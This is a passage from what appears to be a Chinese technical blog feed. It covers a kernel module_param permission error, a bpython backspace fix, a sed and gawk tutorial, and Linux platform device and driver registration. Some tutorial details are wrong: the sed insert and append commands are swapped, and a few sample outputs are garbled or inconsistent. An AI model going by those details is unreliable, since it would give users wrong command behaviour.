insmod module_param.ko </span><br><span class="line">Dec 22 00:12:19 ubuntu kernel: [54954.592554] age = 25, name = [ Li Gang ]</span><br></pre></td></tr></table></figure><p><strong>问题</strong></p><p><img src="/img/kernel/module_param_error.png" alt="module_param err"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/Postgres/driver/module_param/module_param.c:24:1: note: in expansion of macro ‘module_param’</span><br><span class="line"> module_param(age, int, 0666);</span><br></pre></td></tr></table></figure><p>最后发现是module_param声明中有关权限的问题，</p><p>内核态的所属用户为<code>root</code>  即赋予的  <code>user</code>权限  可以使 <code>r w x</code>  但是<code>group</code> <code>other</code> 的权限最多为 读<code>r, x</code></p><p>不能是可写的.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Arm </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bPython-空格删除一行</title>
      <link href="/2017/12/12/software/bPython-%E7%A9%BA%E6%A0%BC%E5%88%A0%E9%99%A4%E4%B8%80%E8%A1%8C/"/>
      <url>/2017/12/12/software/bPython-%E7%A9%BA%E6%A0%BC%E5%88%A0%E9%99%A4%E4%B8%80%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>经常在有些xshell中使用bpython会出现按一下退格键删除整行的情况。</p><p>解决办法，选择xshell属性中的terminal(终端)-&gt;keyboard(键盘)，把backspace键序列修改成 ASCII 127，问题解决</p><a id="more"></a><p><br></p><p><img src="/img/software/bpython_backspace.png" alt="xshell_bpython"></p>]]></content>
      
      
      <categories>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>gawk sed</title>
      <link href="/2017/12/10/commands/shell-gawk-sed/"/>
      <url>/2017/12/10/commands/shell-gawk-sed/</url>
      
        <content type="html"><![CDATA[<h3 id="sed-流编辑器"><a href="#sed-流编辑器" class="headerlink" title="sed  流编辑器"></a>sed  流编辑器</h3><p>流编辑器会在编辑器处理数据之前基于预先提供的一组规则来编辑数据流</p><ul><li>一次从输入中读取一行数据,  基于换行符位置将数据分成行</li><li>根据所提供的编辑器命令匹配数据</li><li>按照命令修改流中的数据</li><li>将新的数据输出到STDOUT</li></ul><a id="more"></a><p><br></p><h4 id="替换标记"><a href="#替换标记" class="headerlink" title="替换标记"></a>替换标记</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed  options  &apos;[address][command]/pattern/replacement/[flags]&apos;  filename</span><br></pre></td></tr></table></figure><p>Options:</p><ul><li>-e  script    在处理输入时, 将script中指定的命令添加到已有的命令中</li><li>-f   file         在处理输入时, 将file中指定的命令添加到已有的命令队列中</li><li>-n                 不产生命令输出, 使用print命令来完成输出  <code>sed -n &#39;p&#39;  filename</code></li></ul><ol><li><p>address:</p><ol><li><p>数字方式寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &apos;起始行, 结尾行[command]/pattern/replacement/[flags]&apos;  filename</span><br></pre></td></tr></table></figure></li><li><p>文本模式过滤器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;/pattern/command&apos;  ## 文本搜索匹配行</span><br></pre></td></tr></table></figure></li></ol></li><li><p>command</p><ol><li><p>替换 (s)  </p><p>flags 可选参数:</p><ul><li>number 表明替换第基础匹配文本</li><li>g             表明新文本将会替换所有匹配的文本</li><li>p             表明原先行的内容要打印出来</li><li>w   file    将替换的结果写入到文件中</li></ul><p>​</p><ol><li>删除 (d)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sed  &apos;2,5d&apos;  filename   ## 将filename文本中2-5行删除</span><br><span class="line">sed  &apos;/bash/d&apos; filename ## 删除bash匹配行</span><br></pre></td></tr></table></figure><p>​</p><ol><li>插入 (i) 和 追加 (a)</li></ol><ul><li><p>插入命令(i)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &apos;2a this is ok&apos; filename</span><br></pre></td></tr></table></figure></li><li><p>追加命令(a)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &apos;2i this is ok&apos;  filename</span><br></pre></td></tr></table></figure><p>​</p></li></ul><ol><li>修改  (c)  允许直接修改数据流中整行文本的内容</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &apos;1c #!/bin/zsh&apos;  filename</span><br></pre></td></tr></table></figure><p>​</p><ol><li>转换  (y)  可以处理单个字符的sed命令</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[address]y/inchars/outchars/</span><br></pre></td></tr></table></figure><p>转换命令会对inchars 和outchars的值一对一进行映射, inchars中的第一个字符会被转化为outchars中第一个字符.  即  inchars 和 outchars 的长度相同</p><p>​</p></li></ol></li><li><p>flags标记</p><ol><li>w   file    将替换的结果写入到文件中</li><li>r    file     将file中的内容读取</li></ol></li></ol><p><br></p><h5 id="直接写入文本-options-i"><a href="#直接写入文本-options-i" class="headerlink" title="直接写入文本  options -i"></a>直接写入文本  options -i</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &apos;/china/a hello,world&apos; -i   filename.sh</span><br></pre></td></tr></table></figure><p><br></p><h5 id="执行多个命令"><a href="#执行多个命令" class="headerlink" title="执行多个命令"></a>执行多个命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -e &apos;s/str1/str1/; s/str2/str/&apos;  filename</span><br></pre></td></tr></table></figure><p><br></p><h5 id="从文本中读取编辑器命令"><a href="#从文本中读取编辑器命令" class="headerlink" title="从文本中读取编辑器命令"></a>从文本中读取编辑器命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cat scripy.sed </span><br><span class="line">s/read/read -p/</span><br><span class="line">s/filename/read -p/</span><br><span class="line"></span><br><span class="line">$sed -f scripy.sed read.sh    ##执行;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="多行文本处理"><a href="#多行文本处理" class="headerlink" title="多行文本处理"></a>多行文本处理</h4><p>sed 编辑器有时需要跨多行的数据执行特定操作, 如果查找或者替换一个短语， 更需要如此;</p><ul><li>N:  将数据流中的下一行加进来创建一个多行组来处理</li><li>D:  删除多行组中的一行</li><li>P:  打印多行组中的一行</li></ul><ol><li><p>next 命令</p><p>小写的n命令会告诉sed编辑器移动到数据流中的下一文本行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$cat mail</span><br><span class="line">Postgres@gangzai.online</span><br><span class="line">rich#her@here.com</span><br><span class="line">rich_herew#here.com</span><br><span class="line">rich+herew#here.com</span><br><span class="line"></span><br><span class="line">$sed &apos;/header/&#123;n, d&#125;&apos; mail</span><br><span class="line"> Postgres@gangzai.online</span><br><span class="line"> rich_herew#here.com</span><br><span class="line"> rich+herew#here.com</span><br></pre></td></tr></table></figure></li></ol><p><br></p><h4 id="保持空间"><a href="#保持空间" class="headerlink" title="保持空间"></a>保持空间</h4><ol><li><p>模式空间 是一块活跃的缓冲区, 在 sed编辑器执行命令时它会保存待检查文本, 但它并不是sed编辑器保存文本的唯一空间.</p></li><li><p>sed 保持空间: 在处理模式空间的某些行时, 可以用保持空间来 临时保存一些行</p><ol><li>操作命令:<br>| 命  令 | 描    述         |<br>| —- | ————– |<br>| h    | 将模式空间复制到保存空间   |<br>| H    | 将模式空间附加到保存空间   |<br>| g    | 将保存空间复制到模式空间   |<br>| G    | 将保存空间附加到模式空间   |<br>| x    | 交换模式空间和保持空间的内容 |</li></ol></li></ol><p><br></p><h3 id="gawk"><a href="#gawk" class="headerlink" title="gawk"></a>gawk</h3><ul><li>定义变量保存数据</li><li>使用算术和字符串操作符来处理数据</li><li>使用结构化编程概念(if-then语句)来为数据处理增加处理逻辑</li><li><p>通过提取数据文件中的数据元素, 将其重新排列或格式化,生成格式化报告</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令格式:</span><br><span class="line">gawk options  program file</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h5 id="从命令行读取程序脚本"><a href="#从命令行读取程序脚本" class="headerlink" title="从命令行读取程序脚本"></a>从命令行读取程序脚本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gawk &apos;&#123; print &apos;hello,world&apos; &#125;&apos;</span><br></pre></td></tr></table></figure><ol><li>print 命令将文件输出到STDOUT中</li><li>命令行并没有指定文件名, 因此将会从STDIN接收数据, 运行后, 他将会一直等待从STDIN输入的文本</li></ol><p><br></p><h5 id="数据变量"><a href="#数据变量" class="headerlink" title="数据变量"></a>数据变量</h5><ul><li>$0  代表整个文本行</li><li>$1   代表文本行中第一个数据字段</li></ul><p>在文本中， 每个数据字段都是通过字段分隔符来划分的 (IFS)  可以使用 -F 参数指定文件分隔符</p><p>gawk默认的字段分隔符是任意的空白字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$gawk &apos;&#123;print $1&#125;&apos; /etc/passwd</span><br><span class="line">root❌0:0:root:/root:/bin/bash</span><br><span class="line">daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologi</span><br><span class="line"></span><br><span class="line">$gawk -F: &apos;&#123;print $1&#125;&apos; /etc/passwd</span><br><span class="line">root</span><br><span class="line">daemon</span><br><span class="line"></span><br><span class="line">$ echo &quot;this is china&quot; | gawk &apos;&#123;$3=&quot;jinan&quot;; print $0 &#125;&apos; </span><br><span class="line">this is jinan</span><br></pre></td></tr></table></figure><p><br></p><h5 id="gawk-脚本"><a href="#gawk-脚本" class="headerlink" title="gawk 脚本"></a>gawk 脚本</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BEGIN&#123;&#125;   表示在处理数据之前进行的操作</span><br><span class="line">&#123;&#125;        表示每行数据都进行处理操作</span><br><span class="line"> &#123;&#125; 中的编程语句  类似于 python + c  ;  使用python 结构语法， c的段落</span><br><span class="line">END&#123;&#125;     表示结束所有行数据操作，之后进行的结尾操作</span><br></pre></td></tr></table></figure><pre><code> #!/bin/awk -fBEGIN{                ##处理之前脚本    math = 0    english = 0    computer = 0    max = 0    printf &quot;  NAME   NO   MATH   ENGLISH   COMPUTER\n&quot;    printf &quot;---------------------------------------\n&quot;}{       math += $3       english += $4       computer += $5       a[$1] = $3+$4+$5       printf &quot;%6s  %6s  %4d  %4d  %4d  %4d\n&quot;, $1, $2, $3, $4, $5, $3+$4+$5}END{    ## 结束;    printf &quot;---------------------------------------\n&quot;    printf &quot;平均分 math=%d  english=%d  computer=%d\n&quot;, math/NR, english/NR, computer/NR    for(i in a)     {        if(a[i] &gt; a[max])        {            max = i        }    }    printf &quot;最高分: %s   %d\n&quot;, max, a[max]}</code></pre><p><br></p><h4 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h4><p>gawk 变量:</p><h5 id="内建变量"><a href="#内建变量" class="headerlink" title="内建变量"></a>内建变量</h5><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td>FIELDWIDTHS</td><td>由空格分隔的一列数字, 定义了每个数据字段确切宽度</td></tr><tr><td>FS</td><td>输入字段分隔符</td></tr><tr><td>RS</td><td>输入记录分隔符</td></tr><tr><td>OFS</td><td>输出字段分隔符</td></tr><tr><td>ORS</td><td>输出记录分隔符</td></tr></tbody></table><table><thead><tr><th>变 量</th><th>描述</th></tr></thead><tbody><tr><td>ARGC</td><td>当前命令行参数个数</td></tr><tr><td>ARGV</td><td>包含命令行参数的数组</td></tr><tr><td>ARGIND</td><td>当前文件在ARGV中的位置</td></tr><tr><td>CONVFMT</td><td>数字的转换格式(sprintf语句)</td></tr><tr><td>ENVIRON</td><td>当前shell环境变量及其值组成的关联数组</td></tr><tr><td>ERRNO</td><td>当读取或关闭输入文件发生错误时的系统错误号</td></tr><tr><td>FILENAME</td><td>用作gawk输入数据的数据文件的文件名</td></tr><tr><td>FNR</td><td>当前数据文件中的数据行数</td></tr><tr><td>IGNORECASE</td><td>设成非零值时, 忽略gawk命令中的字符大小写</td></tr><tr><td>NF</td><td>数据文件中的字段总数</td></tr><tr><td>NR</td><td>已处理的输入记录数</td></tr><tr><td>OFMT</td><td>数字的输出格式, 默认值为%.6g</td></tr><tr><td>RLENGTH</td><td>由match函数所匹配的子字符串长度</td></tr><tr><td>RSTART</td><td>由match函数所匹配的子字符串的起始位置</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gawk &apos;BEGIN&#123; print ENVIRON[&quot;USER&quot;]&#125;&apos;</span><br></pre></td></tr></table></figure><p><br></p><h5 id="自定义变量"><a href="#自定义变量" class="headerlink" title="自定义变量"></a>自定义变量</h5>]]></content>
      
      
      <categories>
          
          <category> 命令篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kernel-设备驱动注册</title>
      <link href="/2017/12/06/kernel/Kernel-%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E6%B3%A8%E5%86%8C/"/>
      <url>/2017/12/06/kernel/Kernel-%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E6%B3%A8%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="设备驱动"><a href="#设备驱动" class="headerlink" title="设备驱动"></a>设备驱动</h3><p>​    Linux设备驱动分为三个实体总线、设备(device)、驱动(driver), 平台总线将设备和驱动匹配。</p><p>2.6 内核加入了platform虚拟总线，platform机制将设备本身的资源注册进内核，由内核统一管理。</p><ul><li>在系统注册任意一个驱动时， 都会寻找对应的设备。</li><li>当系统注册设备时，系统也会寻找对应的驱动进行匹配。</li></ul><a id="more"></a><p><img src="/img/kernel/Linux_驱动与设备匹配.png" alt="总线-设备-驱动 关系"></p><h4 id="Linux设备"><a href="#Linux设备" class="headerlink" title="Linux设备"></a>Linux设备</h4><p>Linux将设备分为三大类: 字符设备、块设备、网络设备。</p><ul><li>字符设备， 字符设备是能够像字节流一样被访问的设备。常见led，蜂鸣器，串口，键盘等等。</li><li>块设备， 块设备通过内存缓冲区访问，<strong>可以随机存取</strong>的设备。通过传输固定大小的数据(一般为512或1k)来访问设备。一般性的理解就是存储介质类的设备，常见字符设备有u盘，TF卡，eMMC,电脑硬盘，光盘等</li><li>网络设备，可以和其他主机交换数据的设备。常见的以太网设备，wifi，蓝牙等</li></ul><p><code>cat /proc/devices</code> 可以看到不同的设备都有编号。</p><p>主设备号 256， 从设备号  256。 故理论上就有<code>256 * 256</code> 个设备号。</p><p><br></p><h4 id="主设备号、从设备号"><a href="#主设备号、从设备号" class="headerlink" title="主设备号、从设备号"></a>主设备号、从设备号</h4><p>在设备管理中,除了设备类型外，内核还需要一对称为主从设备号的参数， 才能唯一标识一个设备。</p><h5 id="主设备号"><a href="#主设备号" class="headerlink" title="主设备号"></a>主设备号</h5><p>​    用于标识驱动程序， 相同的主设备号使用相同的驱动程序。</p><h5 id="从设备号"><a href="#从设备号" class="headerlink" title="从设备号"></a>从设备号</h5><p>​    用于标识同一驱动程序的不同硬件。</p><p><br></p><h4 id="Linux-驱动-和-设备-注册过程"><a href="#Linux-驱动-和-设备-注册过程" class="headerlink" title="Linux 驱动 和 设备 注册过程"></a>Linux 驱动 和 设备 注册过程</h4><p>Linux内核会要求每出现一个设备就要向总线汇报， 或者 出现一个驱动，也要向总线汇报， 或者叫做注册。</p><p>系统初始化的时候，会扫描链接了哪些设备，并为每一个设备建立一个struct platform_device的变量，然后将设备的变量插入到devices链表中。如下图所示:</p><p><img src="/img/kernel/Linux_device链表.png" alt="Linux_device链表"></p><p>系统初始化任意一个驱动程序的时候，也要准备一个struct platform_driver 结构变量， 然后将驱动的变量插入到drivers链表，如下图所示:</p><p><img src="/img/kernel/Linux_drivers链表.png" alt="Linux_drivers链表"></p><p>Linux总线为了将设备 与 驱动绑定，方便管理。 在注册设备，或者注册驱动时，都会寻找与之匹配的设备，而匹配由总线<code>platform_match</code>函数完成。</p><p><strong>注册设备的结构体platform_device， 注册驱动的结构体为platform_driver。设备和驱动的结构体成员name字段，相同则匹配。  并且匹配成功，则会调用platform_driver中的probe函数，注册驱动。</strong></p><p><img src="/img/kernel/platform_match.png" alt="platform_match"></p><p><strong>platform_match() 函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * platform_match - bind platform device to platform driver.</span></span><br><span class="line"><span class="comment"> * @dev: device.</span></span><br><span class="line"><span class="comment"> * @drv: driver.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Platform device IDs are assumed to be encoded like this:</span></span><br><span class="line"><span class="comment"> * "&lt;name&gt;&lt;instance&gt;", where &lt;name&gt; is a short description of the type of</span></span><br><span class="line"><span class="comment"> * device, like "pci" or "floppy", and &lt;instance&gt; is the enumerated</span></span><br><span class="line"><span class="comment"> * instance of the device, like '0' or '42'.  Driver IDs are simply</span></span><br><span class="line"><span class="comment"> * "&lt;name&gt;".  So, extract the &lt;name&gt; from the platform_device structure,</span></span><br><span class="line"><span class="comment"> * and compare it against the name of the driver. Return whether they match</span></span><br><span class="line"><span class="comment"> * or not.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">platform_match</span><span class="params">(struct device *dev, struct device_driver *drv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform_device</span> *<span class="title">pdev</span> = <span class="title">to_platform_device</span>(<span class="title">dev</span>);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform_driver</span> *<span class="title">pdrv</span> = <span class="title">to_platform_driver</span>(<span class="title">drv</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Attempt an OF style match first */</span></span><br><span class="line"><span class="keyword">if</span> (of_driver_match_device(dev, drv))</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Then try to match against the id table */</span></span><br><span class="line"><span class="keyword">if</span> (pdrv-&gt;id_table)</span><br><span class="line"><span class="keyword">return</span> platform_match_id(pdrv-&gt;id_table, pdev) != <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fall-back to driver name match */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">strcmp</span>(pdev-&gt;name, drv-&gt;name) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="驱动-platform-driver"><a href="#驱动-platform-driver" class="headerlink" title="驱动   platform_driver"></a>驱动   platform_driver</h4><ul><li><p>头文件:    </p><ul><li><p>结构体:  platform_driver </p></li><li><p>位于 include/linux/platform_device.h 头文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">platform_driver_register</span><span class="params">(struct platform_driver *)</span></span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">platform_driver_unregister</span><span class="params">(struct platform_driver *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform_driver</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> (*probe)(struct platform_device *);  <span class="comment">// 进行设备的探测和初始化。</span></span><br><span class="line">    <span class="keyword">int</span> (*remove)(struct platform_device *); <span class="comment">// 移除驱动，用于去掉设备节点或者释放软硬件资源</span></span><br><span class="line"><span class="keyword">void</span> (*shutdown)(struct platform_device *);</span><br><span class="line"><span class="keyword">int</span> (*suspend)(struct platform_device *, <span class="keyword">pm_message_t</span> state);</span><br><span class="line"><span class="keyword">int</span> (*resume)(struct platform_device *);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device_driver</span> <span class="title">driver</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">platform_device_id</span> *<span class="title">id_table</span>;</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​</p></li></ul></li><li><p>驱动常见状态：</p><ul><li><p>初始化</p></li><li><p>移除</p></li><li><p>休眠</p></li><li><p>复位</p><p>​</p></li></ul></li></ul><ol><li><p>probe函数:</p><p>platform_match 函数匹配之后， 驱动调用的初始化函数</p></li><li><p>remove函数:</p><p>移除驱动函数</p></li><li><p>suspend函数</p><p>悬挂(休眠)驱动函数</p></li><li><p>resume函数:</p><p>休眠后恢复驱动</p></li><li><p>shudown 函数:</p></li><li><p>device_driver 数据结构</p><p>name 和 注册设备name 一致</p><p>owner 一般赋值<strong>THIS_MODULE</strong></p></li></ol><p><br></p><h4 id="设备-platform-device"><a href="#设备-platform-device" class="headerlink" title="设备  platform_device"></a>设备  platform_device</h4><p>头文件:    </p><ul><li><p>结构体:  platform_device</p></li><li><p>位于 include/linux/platform_device.h 头文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform_device</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* name;  <span class="comment">//设备名称， 在 /sys/devices 会显示。</span></span><br><span class="line"><span class="keyword">int</span>id; <span class="comment">//设备id，用于插入总线并且具有相同name的设备编号，如果只有一个设备则为-1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span><span class="title">dev</span>;</span> <span class="comment">//结构体中内嵌的device结构体</span></span><br><span class="line">u32num_resources;<span class="comment">//设备使用资源的数量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">resource</span>* <span class="title">resource</span>;</span><span class="comment">//设备使用的资源数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">platform_device_id</span>*<span class="title">id_entry</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* MFD cell pointer */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mfd_cell</span> *<span class="title">mfd_cell</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* arch specific additions */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pdev_archdata</span><span class="title">archdata</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>第二个参数”id”  表示子设备编号， 一个设备如果有多个子设备，则需要写入子设备号数量， 只有一个则为 -1</p><p>​</p><p>定义于: <code>$kernel/drivers/base/platform.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * platform_device_register - add a platform-level device</span></span><br><span class="line"><span class="comment"> * @pdev: platform device we're adding</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">platform_device_register</span><span class="params">(struct platform_device *pdev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">device_initialize(&amp;pdev-&gt;dev);</span><br><span class="line"><span class="keyword">return</span> platform_device_add(pdev);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(platform_device_register);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * platform_device_unregister - unregister a platform-level device</span></span><br><span class="line"><span class="comment"> * @pdev: platform device we're unregistering</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Unregistration is done in 2 steps. First we release all resources</span></span><br><span class="line"><span class="comment"> * and remove it from the subsystem, then we drop reference count by</span></span><br><span class="line"><span class="comment"> * calling platform_device_put().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">platform_device_unregister</span><span class="params">(struct platform_device *pdev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">platform_device_del(pdev);</span><br><span class="line">platform_device_put(pdev);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(platform_device_unregister);</span><br></pre></td></tr></table></figure><p>​</p></li></ul><h4 id="注册设备到平台总线"><a href="#注册设备到平台总线" class="headerlink" title="注册设备到平台总线:"></a>注册设备到平台总线:</h4><p><strong>以三星itop-4412为例:</strong></p><p><strong>方法适用于源码：(静态注册)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi $itop-kernel/arch/arm/mach-exynos/mach-itop4412.c</span><br></pre></td></tr></table></figure><p><img src="/img/kernel/hello_module_src.png" alt="Hello_module_src"></p><p><img src="/img/kernel/platform_device_initdata.png" alt="platform_device_初始化数组"></p><p><strong>注:</strong>    s3c_device_hello_ctl 即注册的platform_device 设备变量信息.</p><p>按照其他模块方式编写。 hello模块即可， 同时确保 宏定义 ，变量未重复。</p><p>对应在 <code>$itop-kernel/drivers/char/Kconfig</code> 添加对应模块选择配置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config HEOLL_CTL</span><br><span class="line"><span class="keyword">bool</span> <span class="string">"Enable hello config"</span></span><br><span class="line"><span class="keyword">default</span> y</span><br><span class="line">help</span><br><span class="line">Enable hello config</span><br></pre></td></tr></table></figure><p>即<code>make menuconfig</code>  所示如下图:</p><p><img src="/img/kernel/hello_module.png" alt="hello_module"></p><p>即保存退出， 重新编译 <code>make zImage</code> , 烧写至开发板。</p><p><code>ls -ls  /sys/devices/platform</code>   即可看到新注册的hello驱动。</p><p><code>ls /sys/class/misc/</code></p><p><br></p><p><strong>方法二:(动态注册)  </strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 